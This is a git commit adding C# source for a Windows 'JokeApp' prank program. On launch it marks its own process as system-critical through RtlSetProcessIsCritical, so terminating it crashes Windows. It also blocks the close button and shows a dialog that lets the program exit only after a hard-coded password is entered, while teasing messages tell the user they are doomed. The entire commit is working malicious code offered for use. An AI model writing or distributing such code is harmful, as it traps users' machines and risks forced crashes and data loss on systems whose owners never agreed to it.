82cd30e9def3dc314fe1f1f78d25fd97eb017993
ilyfairy <52264192+ilyfairy@users.noreply.github.com>
2020-08-08 15:32:58 +0800

    Add files via upload

---
+++ JokeApp/Form1.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace JokeApp
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("ntdll.dll")]
+        public static extern void RtlSetProcessIsCritical(bool a, bool b, bool c);
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.EnterDebugMode();
+            RtlSetProcessIsCritical(true, false, false);
+        }
+
+        private readonly int WM_SYSCOMMAND = 0x112;
+        private readonly IntPtr SC_CLOSE = (IntPtr)0xF060;
+        protected override void WndProc(ref Message msg)
+        {
+            if (msg.Msg == WM_SYSCOMMAND && msg.WParam == SC_CLOSE)
+            {
+                new off().ShowDialog();
+                return;
+            }
+            base.WndProc(ref msg);
+        }
+
+        private void Form1_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show(new List<string>() {"啊这，好像什么也没发生","QAQ" ,"啊这，感觉你要完蛋了诶" ,"该怎么办QAQ"}[new Random().Next(0,4)],"qwq");
+        }
+    }
+}
---
+++ JokeApp/off.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace JokeApp
+{
+    public partial class off : Form
+    {
+        [DllImport("ntdll.dll")]
+        public static extern void RtlSetProcessIsCritical(bool a, bool b, bool c);
+        public off()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (textBox1.Text == "xiaoxiannvlalala")
+            {
+                RtlSetProcessIsCritical(false, false, false);
+                Environment.Exit(0);
+                return;
+            }
+            MessageBox.Show(new List<string>() { "猜错啦！", "猜不到怎么办QAQ", "QwQ" }[new Random().Next(0, 3)], "qwq");
+        }
+    }
+}
